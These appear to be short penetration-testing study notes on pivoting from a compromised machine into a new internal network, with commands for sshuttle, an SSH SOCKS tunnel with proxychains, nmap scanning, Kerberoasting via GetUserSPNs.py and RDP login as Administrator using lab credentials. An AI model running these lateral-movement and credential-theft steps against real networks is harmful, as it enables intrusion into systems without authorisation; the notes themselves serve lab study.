# Pivoting

## Situation:
- on a machine that allows access to 2 network interfaces that share a new network that wasn't available to you before

## How to pivot:
- have compromised a machine and have full access to it

### SSHUTTLE
```bash
sshuttle -r <username>@<target ip> <CIDR of new network> --ssh-cmd "ssh -i pivot"
```

### Proxychains
```bash
cat /etc/proxychains4.conf
```
- proxy list at the bottom: "socks4 127.0.0.1 9050"
```bash
ssh -f -N -D 9050 -i pivot <username>@<target ip>
```
- -f = backgrounds SSH
- -N = we dont want to execute commands(ideal for port forwarding)
- -D = bind port to:
+ established connection
#### Running commands on pivoted network
```bash
proxychains <command>
```
```bash
proxychains nmap -p88 10.10.10.255
```

## Attacking through proxychains
```bash
proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.255 -request
```
```bash
proxychains xfreerdp /u:Administrator /p:'Hacker321!' /v:10.10.10.255
```